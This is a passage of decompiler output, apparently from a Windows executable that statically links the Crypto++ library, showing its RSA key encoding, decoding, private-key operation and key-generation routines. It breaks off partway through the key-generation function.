// 4BABDC: using guessed type void *CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable';

//----- (0044F3E0) --------------------------------------------------------
void __thiscall sub_44F3E0(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 16);
  v2 = *(void **)(this + 20);
  if ( *(_DWORD *)(this + 12) < v1 )
    v1 = *(_DWORD *)(this + 12);
  memset(*(void **)(this + 20), 0, 4 * v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0044F457) --------------------------------------------------------
_DWORD *__thiscall sub_44F457(_DWORD *this, char a2)
{
  _DWORD *v2; // edi

  v2 = this - 1;
  sub_414B60(this + 2);
  v2[68] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0044F4C0) --------------------------------------------------------
_DWORD *__thiscall sub_44F4C0(_DWORD *this, char a2)
{
  sub_40A6C0(this + 3);
  this[18] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0044F4F0) --------------------------------------------------------
int __thiscall sub_44F4F0(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 36))(this - 1) + 68;
}

//----- (0044F500) --------------------------------------------------------
int __thiscall sub_44F500(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 72))(this - 1) + 68;
}

//----- (0044F510) --------------------------------------------------------
int __thiscall sub_44F510(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(*(this - 1) + 80))(this - 1) + 8;
}

//----- (0044F520) --------------------------------------------------------
int __stdcall sub_44F520(int a1)
{
  sub_41E390(a1);
  return a1;
}

//----- (0044F540) --------------------------------------------------------
int __stdcall sub_44F540(int a1)
{
  sub_451950(a1);
  return a1;
}

//----- (0044F560) --------------------------------------------------------
void __thiscall __noreturn sub_44F560(_DWORD *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 12))(this + 2);
  sub_43A820(v1);
}
// 43A820: using guessed type void __thiscall __noreturn sub_43A820(_DWORD);

//----- (0044F570) --------------------------------------------------------
_DWORD *__thiscall sub_44F570(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edi
  int v5; // esi
  int *v6; // eax

  v4 = *(_DWORD *)(this[2] + 4);
  v5 = *(_DWORD *)((char *)this + v4 + 8);
  v6 = sub_437650();
  (*(void (__thiscall **)(int, int *, _DWORD))(v5 + 16))((int)this + v4 + 8, v6, 0);
  sub_44E580(a2, a3, (int)(this + 9), this + 3);
  return a2;
}

//----- (0044F5B0) --------------------------------------------------------
_DWORD *__thiscall sub_44F5B0(void *this, int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *(__thiscall *v8)(_DWORD *, _DWORD *); // [esp+3Ch] [ebp-18h]
  int v9; // [esp+40h] [ebp-14h]
  _DWORD v10[3]; // [esp+48h] [ebp-Ch] BYREF

  v8 = sub_451880;
  v9 = -8;
  sub_44EB60(v10, (int)this - 260, a2);
  v2 = sub_44E870(v10, "Prime1", (void (__thiscall *)(int, _DWORD *))sub_451880, -8, 0);
  v3 = sub_44E870(v2, "Prime2", (void (__thiscall *)(int, _DWORD *))sub_451890, -8, 0);
  v4 = sub_44E870(v3, "PrivateExponent", (void (__thiscall *)(int, _DWORD *))sub_4518A0, -8, 0);
  v5 = sub_44E870(v4, "ModPrime1PrivateExponent", (void (__thiscall *)(int, _DWORD *))sub_451840, -8, 0);
  v6 = sub_44E870(v5, "ModPrime2PrivateExponent", (void (__thiscall *)(int, _DWORD *))sub_451850, -8, 0);
  return sub_44E870(v6, "MultiplicativeInverseOfPrime2ModPrime1", (void (__thiscall *)(int, _DWORD *))sub_451870, -8, 0);
}
// 44F5B0: using guessed type _DWORD var_C[3];

//----- (0044F700) --------------------------------------------------------
_DWORD *__thiscall sub_44F700(void *this, int a2)
{
  _DWORD *v2; // eax
  _DWORD *(__thiscall *v4)(_DWORD *, _DWORD *); // [esp+Ch] [ebp-18h]
  int v5; // [esp+10h] [ebp-14h]
  _DWORD v6[3]; // [esp+18h] [ebp-Ch] BYREF

  v4 = sub_451860;
  v5 = -8;
  sub_44ED20(v6, (int)this - 60, a2);
  v2 = sub_44E990(v6, "Modulus", (void (__thiscall *)(int, _DWORD *))sub_451860, -8, 0);
  return sub_44E990(v2, "PublicExponent", (void (__thiscall *)(int, _DWORD *))sub_4518B0, -8, 0);
}
// 44F700: using guessed type _DWORD var_C[3];

//----- (0044F780) --------------------------------------------------------
char __thiscall sub_44F780(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4E991C, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&CryptoPP::PrimeSelector const * `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E9918: using guessed type const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor';
// 4E991C: using guessed type int dword_4E991C;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (0044F7E0) --------------------------------------------------------
void __thiscall sub_44F7E0(_DWORD *this, int a2, int a3, int a4)
{
  size_t v5; // ecx
  unsigned __int64 v6; // rax
  _BYTE *v7; // esi
  int v8; // eax
  int v9; // edx
  size_t v10; // edi
  int v11; // eax
  _DWORD v12[3]; // [esp+10h] [ebp-50h] BYREF
  _BYTE *v13; // [esp+1Ch] [ebp-44h]
  size_t v14; // [esp+20h] [ebp-40h] BYREF
  char v15; // [esp+27h] [ebp-39h] BYREF
  int v16[10]; // [esp+28h] [ebp-38h] BYREF
  int v17; // [esp+5Ch] [ebp-4h]

  sub_432B70(v16, a2, 48);
  v16[0] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v16[1] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v17 = 0;
  if ( !sub_4371D0(v16, (int)&v15) )
    goto LABEL_16;
  if ( v15 != 2 )
    goto LABEL_16;
  if ( !sub_433820((int)v16, &v14) )
    goto LABEL_16;
  LODWORD(v6) = (*(int (__thiscall **)(int *))(v16[0] + 64))(v16);
  v5 = v14;
  if ( v14 > v6 )
    goto LABEL_16;
  if ( !v14 )
    goto LABEL_16;
  sub_419060(v12, v14);
  v7 = v13;
  LOBYTE(v17) = 1;
  v8 = (*(int (__thiscall **)(int *, _BYTE *, size_t))(v16[0] + 72))(v16, v13, v14);
  v5 = v14;
  if ( v14 != v8 )
    goto LABEL_16;
  if ( v14 > 4 )
  {
    while ( !*v7 )
    {
      --v5;
      ++v7;
      v14 = v5;
      if ( v5 <= 4 )
        goto LABEL_12;
    }
    if ( v5 > 4 )
LABEL_16:
      sub_433790(v5);
  }
LABEL_12:
  v9 = 0;
  v10 = 0;
  if ( v5 )
  {
    do
    {
      v11 = (unsigned __int8)v7[v10++];
      v9 = v11 | (v9 << 8);
    }
    while ( v10 < v5 );
    if ( v9 )
      goto LABEL_16;
  }
  LOBYTE(v17) = 0;
  sub_419010(v12);
  (*(void (__thiscall **)(_DWORD *, int *))(*(this - 13) + 4))(this - 13, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(*(this - 7) + 4))(this - 7, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[13] + 4))(this + 13, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[19] + 4))(this + 19, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[25] + 4))(this + 25, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[31] + 4))(this + 31, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[37] + 4))(this + 37, v16);
  (*(void (__thiscall **)(_DWORD *, int *))(this[43] + 4))(this + 43, v16);
  sub_434210((int)v16);
  sub_432C40(v16);
}
// 44F882: variable 'v6' is possibly undefined
// 44F9A6: variable 'v5' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 4B8BC4: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 4B8C80: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 44F7E0: using guessed type size_t var_40;
// 44F7E0: using guessed type _DWORD var_50[3];

//----- (0044F9B0) --------------------------------------------------------
void __thiscall sub_44F9B0(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  int v6[14]; // [esp+8h] [ebp-38h] BYREF

  sub_432B70(v6, a2, 48);
  v6[0] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v6[1] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v5 = this[2];
  v6[13] = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(v5 + 4))(this + 2, v6);
  (*(void (__thiscall **)(_DWORD *, int *))(this[8] + 4))(this + 8, v6);
  sub_434210((int)v6);
  sub_432C40(v6);
}
// 4B8BC4: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 4B8C80: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';

//----- (0044FA50) --------------------------------------------------------
_DWORD *__thiscall sub_44FA50(_DWORD *this, _DWORD *a2, int *a3, int a4)
{
  int v4; // ebx
  int v5; // eax
  char *v6; // edi
  int v7; // esi
  int *v8; // eax
  _DWORD *v9; // esi
  int *v10; // eax
  int *v11; // eax
  unsigned int v12; // edx
  void *v13; // esi
  _DWORD *v14; // eax
  unsigned int v15; // edx
  void *v16; // esi
  char v17; // al
  int v18; // edi
  int v19; // esi
  _DWORD *v20; // eax
  int v21; // eax
  _DWORD *v22; // edi
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  bool v25; // bl
  unsigned int v26; // edx
  void *v27; // esi
  unsigned int v28; // edx
  void *v29; // esi
  unsigned int v30; // edx
  void *v31; // esi
  unsigned int v32; // edx
  void *v33; // esi
  int v35; // [esp-10h] [ebp-CCh]
  _DWORD *v36; // [esp-Ch] [ebp-C8h]
  _DWORD *v37; // [esp-8h] [ebp-C4h]
  unsigned int v38; // [esp-4h] [ebp-C0h]
  _DWORD *v39; // [esp-4h] [ebp-C0h]
  int v40[3]; // [esp+10h] [ebp-ACh] BYREF
  _DWORD v41[6]; // [esp+1Ch] [ebp-A0h] BYREF
  int v42[6]; // [esp+34h] [ebp-88h] BYREF
  _DWORD v43[7]; // [esp+4Ch] [ebp-70h] BYREF
  _DWORD v44[2]; // [esp+68h] [ebp-54h] BYREF
  unsigned int v45; // [esp+70h] [ebp-4Ch]
  unsigned int v46; // [esp+74h] [ebp-48h]
  void *v47; // [esp+78h] [ebp-44h]
  _DWORD v48[2]; // [esp+80h] [ebp-3Ch] BYREF
  unsigned int v49; // [esp+88h] [ebp-34h]
  unsigned int v50; // [esp+8Ch] [ebp-30h]
  void *v51; // [esp+90h] [ebp-2Ch]
  _DWORD v52[2]; // [esp+98h] [ebp-24h] BYREF
  unsigned int v53; // [esp+A0h] [ebp-1Ch]
  unsigned int v54; // [esp+A4h] [ebp-18h]
  void *v55; // [esp+A8h] [ebp-14h]
  int v56; // [esp+B8h] [ebp-4h]
  _DWORD *v57; // [esp+BCh] [ebp+0h]
  _DWORD *v58; // [esp+C0h] [ebp+4h]
  int *v59; // [esp+C4h] [ebp+8h]
  _DWORD *v60; // [esp+C8h] [ebp+Ch]
  int v61; // [esp+CCh] [ebp+10h]
  int v62; // [esp+D0h] [ebp+14h]
  _DWORD *v63; // [esp+D4h] [ebp+18h]
  char pExceptionObject[40]; // [esp+D8h] [ebp+1Ch] BYREF
  _DWORD v65[2]; // [esp+100h] [ebp+44h] BYREF
  unsigned int v66; // [esp+108h] [ebp+4Ch]
  unsigned int v67; // [esp+10Ch] [ebp+50h]
  void *Block; // [esp+110h] [ebp+54h]

  v63 = this;
  v4 = 0;
  v43[6] = a2;
  v60 = a2;
  v59 = a3;
  v62 = 0;
  v61 = a4;
  v5 = *(this - 13);
  v56 = 0;
  v6 = (char *)this + *(_DWORD *)(v5 + 4);
  v7 = *((_DWORD *)v6 - 13);
  v8 = sub_437650();
  (*(void (__thiscall **)(char *, int *, _DWORD))(v7 + 16))(v6 - 52, v8, 0);
  v9 = v63 - 12;
  v40[1] = (int)&CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  v57 = v63 - 12;
  v40[2] = (int)v40;
  v40[0] = (int)&CryptoPP::ModularArithmetic::`vftable';
  sub_43D420(v41, v63 - 12);
  v38 = v9[3];
  v56 = 1;
  sub_43D360(v42, 0, v38);
  LOBYTE(v56) = 2;
  sub_43D6C0(v43);
  v56 = 3;
  sub_43D6C0(v44);
  LOBYTE(v56) = 4;
  sub_43D6C0(v48);
  LOBYTE(v56) = 5;
  do
  {
    v10 = sub_443600();
    sub_4431A0(v9, v65, (int)v10);
    v4 |= 2u;
    v62 = v4;
    LOBYTE(v56) = 6;
    v11 = sub_443600();
    sub_4444A0(v44, v59, v11, (int)v65);
    v12 = v67;
    v13 = Block;
    if ( v66 < v67 )
      v12 = v66;
    LOBYTE(v56) = 7;
    memset(Block, 0, 4 * v12);
    if ( v12 )
      j_j_unknown_libname_61(v13);
    else
      j_j___free_base(v13);
    LOBYTE(v56) = 5;
    v14 = sub_442A60(v44, v65, v41);
    LOBYTE(v56) = 8;
    v58 = sub_43DBB0(v43, v14);
    v15 = v67;
    v16 = Block;
    if ( v66 < v67 )
      v15 = v66;
    LOBYTE(v56) = 9;
    memset(Block, 0, 4 * v15);
    if ( v15 )
      j_j_unknown_libname_61(v16);
    else
      j_j___free_base(v16);
    LOBYTE(v56) = 5;
    sub_43DBB0(v48, v58);
    v17 = sub_43DCE0(v48);
    v9 = v57;
  }
  while ( v17 );
  v18 = (int)v63;
  v19 = (int)(v63 - 6);
  sub_43B200(v40, v52, (int)v44, (int)(v63 - 6));
  LOBYTE(v56) = 10;
  v20 = sub_43B820(v40, v52, v61);
  sub_43DBB0(v52, v20);
  v39 = (_DWORD *)(v18 + 176);
  v37 = (_DWORD *)(v18 + 80);
  v36 = (_DWORD *)(v18 + 104);
  v35 = v18 + 128;
  v21 = v18 + 152;
  v22 = v60;
  sub_465410(v60, v52, v21, v35, v36, v37, v39);
  v62 = v4 | 1;
  v23 = sub_43B820(v40, v22, (int)v48);
  sub_43DBB0(v22, v23);
  v24 = sub_43B200(v40, v65, (int)v22, v19);
  LOBYTE(v56) = 11;
  v25 = sub_440F30(v24, v61) != 0;
  v26 = v67;
  v27 = Block;
  if ( v66 < v67 )
    v26 = v66;
  LOBYTE(v56) = 12;
  memset(Block, 0, 4 * v26);
  if ( v26 )
    j_j_unknown_libname_61(v27);
  else
    j_j___free_base(v27);
  LOBYTE(v56) = 10;
  if ( v25 )
  {
    sub_419B80((int)v65, "InvertibleRSAFunction: computational error during private key operation");
    LOBYTE(v56) = 13;
    sub_405180(pExceptionObject, 6, v65);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVException_CryptoPP__);
  }
  v28 = v54;
  v29 = v55;
  if ( v53 < v54 )
    v28 = v53;
  LOBYTE(v56) = 14;
  memset(v55, 0, 4 * v28);
  if ( v28 )
    j_j_unknown_libname_61(v29);
  else
    j_j___free_base(v29);
  v30 = v50;
  v31 = v51;
  if ( v49 < v50 )
    v30 = v49;
  LOBYTE(v56) = 15;
  memset(v51, 0, 4 * v30);
  if ( v30 )
    j_j_unknown_libname_61(v31);
  else
    j_j___free_base(v31);
  v32 = v46;
  v33 = v47;
  if ( v45 < v46 )
    v32 = v45;
  LOBYTE(v56) = 16;
  memset(v47, 0, 4 * v32);
  if ( v32 )
    j_j_unknown_libname_61(v33);
  else
    j_j___free_base(v33);
  sub_439F00(v40);
  return v60;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';
// 44FA50: using guessed type _DWORD var_100[6];
// 44FA50: using guessed type int var_E8[6];
// 44FA50: using guessed type _DWORD var_B4[2];
// 44FA50: using guessed type _DWORD var_9C[2];
// 44FA50: using guessed type _DWORD var_1C[2];
// 44FA50: using guessed type _DWORD var_84[2];

//----- (0044FDD0) --------------------------------------------------------
int __thiscall sub_44FDD0(void *this, unsigned int a2)
{
  if ( a2 > (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this) )
    return 0;
  else
    return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 16))(this);
}

//----- (0044FDF0) --------------------------------------------------------
void __thiscall sub_44FDF0(_DWORD *this, int a2)
{
  _BYTE *v3; // ecx
  unsigned int v4; // eax
  unsigned int v5; // esi
  char v6[4]; // [esp+Ch] [ebp-4Ch] BYREF
  int v7[12]; // [esp+10h] [ebp-48h] BYREF
  int v8; // [esp+40h] [ebp-18h] BYREF
  char v9; // [esp+44h] [ebp-14h]
  char v10[3]; // [esp+45h] [ebp-13h] BYREF
  int v11; // [esp+54h] [ebp-4h]

  sub_432BF0(v7, a2, 48);
  v7[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v7[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v11 = 0;
  v3 = (char *)&v8 + 1;
  v8 = 0;
  v4 = 4;
  v9 = 0;
  do
  {
    if ( *v3 )
      break;
    --v4;
    ++v3;
  }
  while ( v4 > 1 );
  v6[0] = 2;
  v5 = v4 + 1;
  if ( v10[-v4] >= 0 )
    v5 = v4;
  sub_45FD50(v7, v6, 1u, 0, 1);
  sub_433FC0(v7, v5);
  (*(void (__thiscall **)(int *, char *, unsigned int, _DWORD, int))(v7[0] + 24))(v7, &v10[-v5], v5, 0, 1);
  (*(void (__thiscall **)(_DWORD *, int *))(*(this - 13) + 8))(this - 13, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(*(this - 7) + 8))(this - 7, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[13] + 8))(this + 13, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[19] + 8))(this + 19, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[25] + 8))(this + 25, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[31] + 8))(this + 31, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[37] + 8))(this + 37, v7);
  (*(void (__thiscall **)(_DWORD *, int *))(this[43] + 8))(this + 43, v7);
  sub_434250((int)v7);
  sub_432CF0((int)v7);
}
// 4B8C90: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4B8D48: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 44FDF0: using guessed type char var_4C[4];

//----- (0044FF50) --------------------------------------------------------
void __thiscall sub_44FF50(_DWORD *this, int a2)
{
  int v3; // eax
  int v4[16]; // [esp+8h] [ebp-40h] BYREF

  sub_432BF0(v4, a2, 48);
  v4[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v4[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v3 = this[2];
  v4[15] = 0;
  (*(void (__thiscall **)(_DWORD *, int *))(v3 + 8))(this + 2, v4);
  (*(void (__thiscall **)(_DWORD *, int *))(this[8] + 8))(this + 8, v4);
  sub_434250((int)v4);
  sub_432CF0((int)v4);
}
// 4B8C90: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 4B8D48: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';

//----- (0044FFF0) --------------------------------------------------------
int __thiscall sub_44FFF0(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  char v7[8]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v8; // [esp+18h] [ebp-1Ch]
  unsigned int v9; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v11; // [esp+30h] [ebp-4h]

  v1 = (*(int (__thiscall **)(_DWORD *))(this[2] + 4))(this + 2);
  v2 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v1 + 16))(v1, v7);
  v11 = 0;
  v3 = sub_440C10(v2);
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  v11 = 1;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 44FFF0: using guessed type char var_24[8];

//----- (00450080) --------------------------------------------------------
int __thiscall sub_450080(int *this)
{
  int *v1; // esi
  int v2; // eax
  int v3; // edx
  int v4; // eax
  _DWORD *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // edx
  void *v9; // esi
  char v11[8]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v12; // [esp+18h] [ebp-20h]
  unsigned int v13; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v15; // [esp+28h] [ebp-10h]
  int v16; // [esp+34h] [ebp-4h]

  v1 = this + 2;
  v2 = (*(int (__thiscall **)(int *))(this[2] + 12))(this + 2);
  v3 = *v1;
  v15 = v2;
  v4 = (*(int (__thiscall **)(int *))(v3 + 4))(v1);
  v5 = (_DWORD *)(*(int (__thiscall **)(int, char *))(*(_DWORD *)v4 + 4))(v4, v11);
  v16 = 0;
  v6 = sub_440BD0(v5);
  if ( v6 <= 1 )
    v7 = 0;
  else
    v7 = v6 - 1;
  v8 = v13;
  v9 = Block;
  if ( v12 < v13 )
    v8 = v12;
  v16 = 1;
  memset(Block, 0, 4 * v8);
  if ( v8 )
    j_j_unknown_libname_61(v9);
  else
    j_j___free_base(v9);
  v16 = -1;
  return (*(int (__thiscall **)(int, unsigned int))(*(_DWORD *)v15 + 8))(v15, v7);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 450080: using guessed type char var_28[8];

//----- (00450140) --------------------------------------------------------
void __thiscall sub_450140(char *this, int *a2, int *a3)
{
  int v4; // eax
  unsigned __int8 (__thiscall *v5)(int *, const char *, int *, signed int *); // eax
  _DWORD *v6; // eax
  char *v7; // ebx
  void **v8; // edx
  void *v9; // esi
  char v10; // al
  _DWORD *v11; // edi
  char v12; // al
  _BYTE *v13; // eax
  int v14; // esi
  int v15; // eax
  void (__thiscall ***v16)(_DWORD, int); // ecx
  void (__thiscall ***v17)(_DWORD, int); // ecx
  char v18; // al
  _DWORD *v19; // edi
  int *v20; // esi
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  int v24; // eax
  int v25; // esi
  int v26; // esi
  int v27; // eax
  int v28; // esi
  int v29; // esi
  int v30; // eax
  unsigned int v31; // edx
  void *v32; // esi
  int v33[3]; // [esp-18h] [ebp-184h] BYREF
  const char *v34; // [esp-Ch] [ebp-178h]
  void ***v35; // [esp-8h] [ebp-174h]
  int v36; // [esp-4h] [ebp-170h]
  _DWORD v37[6]; // [esp+10h] [ebp-15Ch] BYREF
  _DWORD v38[6]; // [esp+28h] [ebp-144h] BYREF
  void **v39; // [esp+40h] [ebp-12Ch] BYREF
  int v40; // [esp+44h] [ebp-128h] BYREF
  unsigned int v41; // [esp+4Ch] [ebp-120h]
  unsigned int v42; // [esp+50h] [ebp-11Ch]
  void *v43; // [esp+54h] [ebp-118h]
  void **v44; // [esp+5Ch] [ebp-110h] BYREF
  int v45[2]; // [esp+60h] [ebp-10Ch] BYREF
  int v46[2]; // [esp+68h] [ebp-104h] BYREF
  _DWORD *v47; // [esp+70h] [ebp-FCh] BYREF
  int v48[6]; // [esp+74h] [ebp-F8h] BYREF
  int v49[6]; // [esp+8Ch] [ebp-E0h] BYREF
  void **v50; // [esp+A4h] [ebp-C8h]
  void **v51; // [esp+A8h] [ebp-C4h] BYREF
  int v52[2]; // [esp+ACh] [ebp-C0h] BYREF
  int v53[2]; // [esp+B4h] [ebp-B8h] BYREF
  _DWORD *v54; // [esp+BCh] [ebp-B0h] BYREF
  int v55[6]; // [esp+C0h] [ebp-ACh] BYREF
  int v56[6]; // [esp+D8h] [ebp-94h] BYREF
  void **v57; // [esp+F0h] [ebp-7Ch]
  _DWORD v58[6]; // [esp+F4h] [ebp-78h] BYREF
  _DWORD v59[6]; // [esp+10Ch] [ebp-60h] BYREF
  _DWORD v60[2]; // [esp+124h] [ebp-48h] BYREF
  unsigned int v61; // [esp+12Ch] [ebp-40h]
  void **v62; // [esp+130h] [ebp-3Ch] BYREF
  void *Block; // [esp+134h] [ebp-38h]
  void **v64; // [esp+13Ch] [ebp-30h] BYREF
  void (__thiscall ***v65)(_DWORD, int); // [esp+140h] [ebp-2Ch]
  _DWORD *v66; // [esp+148h] [ebp-24h]
  int *v67; // [esp+14Ch] [ebp-20h]
  _BYTE *v68; // [esp+150h] [ebp-1Ch]
  signed int v69; // [esp+154h] [ebp-18h] BYREF
  int v70; // [esp+158h] [ebp-14h]
  char v71; // [esp+15Fh] [ebp-Dh]
  int v72; // [esp+168h] [ebp-4h]
  void **v73; // [esp+16Ch] [ebp+0h] BYREF
  int v74[2]; // [esp+170h] [ebp+4h] BYREF
  _DWORD v75[2]; // [esp+178h] [ebp+Ch] BYREF
  int v76[64]; // [esp+180h] [ebp+14h] BYREF
  void **v77; // [esp+280h] [ebp+114h] BYREF
  int v78[2]; // [esp+284h] [ebp+118h] BYREF
  _DWORD v79[2]; // [esp+28Ch] [ebp+120h] BYREF
  int v80[64]; // [esp+294h] [ebp+128h] BYREF
  char pExceptionObject[16]; // [esp+394h] [ebp+228h] BYREF
  _DWORD v82[6]; // [esp+3A4h] [ebp+238h] BYREF
  _DWORD v83[6]; // [esp+3BCh] [ebp+250h] BYREF

  v66 = this;
  v70 = 0;
  v67 = a2;
  v4 = *a3;
  v36 = (int)&v69;
  v35 = (void ***)&int `RTTI Type Descriptor';
  v34 = "ModulusSize";
  v5 = *(unsigned __int8 (__thiscall **)(int *, const char *, int *, signed int *))(v4 + 4);
  v69 = 2048;
  if ( !v5(a3, "ModulusSize", &int `RTTI Type Descriptor', &v69) )
    (*(void (__thiscall **)(int *, const char *, int *, signed int *))(*a3 + 4))(
      a3,
      "KeySize",
      &int `RTTI Type Descriptor',
      &v69);
  if ( v69 < 16 )
  {
    sub_419B80((int)v83, "InvertibleRSAFunction: specified modulus size is too small");
    v72 = 0;
    sub_405230(pExceptionObject, v83);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_43D500(v33, 0x11u);
  v6 = sub_4396B0(a3, v60, (int)"PublicExponent", v33[0], v33[1], v33[2], (unsigned int)v34, v35, v36);
  v7 = this - 32;
  v72 = 1;
  sub_43DBB0(v7, v6);
  v8 = v62;
  v9 = Block;
  if ( v61 < (unsigned int)v62 )
    v8 = (void **)v61;
  v72 = 2;
  memset(Block, 0, 4 * (_DWORD)v8);
  v36 = (int)v9;
  if ( v8 )
    j_j_unknown_libname_61(v36);
  else
    j_j___free_base((void *)v36);
  v72 = -1;
  sub_43D500(v60, 3u);
  v72 = 3;
  v70 = 1;
  if ( sub_440F30(v7, (int)v60) < 0 || (v10 = sub_4428B0(v7, 0), v71 = 0, !v10) )
    v71 = 1;
  v72 = -1;
  sub_4066A0((int)v60);
  if ( v71 )
  {
    sub_419B80((int)v83, "InvertibleRSAFunction: invalid public exponent");
    v72 = 4;
    sub_405230(pExceptionObject, v83);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v39 = &CryptoPP::RSAPrimeSelector::`vftable';
  sub_43D420(&v40, v7);
  v72 = 5;
  v11 = sub_4650E0(&v62, v69);
  v12 = *((_BYTE *)v11 + 8);
  LOBYTE(v72) = 6;
  v71 = v12;
  v13 = operator new(0x14u);
  v14 = (int)v13;
  v68 = v13;
  if ( v13 )
  {
    v13[8] = v71;
    *((_DWORD *)v13 + 1) = "PointerToPrimeSelector";
    v13[9] = 0;
    *((_DWORD *)v13 + 3) = 0;
    *(_DWORD *)v13 = &CryptoPP::AlgorithmParametersTemplate<CryptoPP::PrimeSelector const *>::`vftable';
    *((_DWORD *)v13 + 4) = &v39;
  }
  else
  {
    v14 = 0;
  }
  v68 = (_BYTE *)v14;
  v15 = v11[1];
  v11[1] = 0;
  v16 = *(void (__thiscall ****)(_DWORD, int))(v14 + 12);
  LOBYTE(v72) = 7;
  v70 = v15;
  if ( v16 )
  {
    (**v16)(v16, 1);
    v15 = v70;
  }
  *(_DWORD *)(v14 + 12) = v15;
  v17 = (void (__thiscall ***)(_DWORD, int))v11[1];
  v68 = 0;
  if ( v17 )
    (**v17)(v17, 1);
  v18 = v71;
  v11[1] = v14;
  *((_BYTE *)v11 + 8) = v18;
  LOBYTE(v72) = 6;
  sub_455040(&v64, (int)v11);
  LOBYTE(v72) = 11;
  if ( Block )
    (**(void (__thiscall ***)(void *, int))Block)(Block, 1);
  v19 = v66;
  v20 = v67;
  LOBYTE(v72) = 10;
  v62 = &CryptoPP::NameValuePairs::`vftable';
